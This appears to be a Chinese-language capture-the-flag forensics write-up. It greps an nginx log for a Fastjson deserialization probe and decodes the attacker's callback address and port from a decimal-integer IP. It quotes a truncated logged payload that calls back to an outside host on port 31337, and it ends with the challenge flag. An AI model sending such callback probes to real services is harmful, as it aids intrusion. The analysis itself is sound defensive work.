# 任务 2：漏洞探测的回连地址

## 题目要求

找出攻击者探测报文解析漏洞时使用的回连 IP 和端口。

提交格式：`flag{<回连IP>:<端口>}`

## 分析过程

在访问日志中检索 Fastjson 探测载荷：

```bash
grep -nE "3405803783|31337|probe" /var/log/nginx/access.log
```

命中的请求包含：

```text
203.0.113.7 - - [12/Aug/2026:03:42:17 +0800]
"GET /api/parse?msg=...@type...http://3405803783:31337/probe... HTTP/1.1"
```

载荷中的端口为 `31337`。其中 `3405803783` 是回连 IP 的十进制整数表示，将其转换为 IPv4 点分格式：

```bash
python -c 'import ipaddress; print(ipaddress.ip_address(3405803783))'
```

输出：

```text
203.0.113.7
```

因此，攻击者使用的完整回连地址为 `203.0.113.7:31337`。

## 结论

```text
flag{203.0.113.7:31337}
```
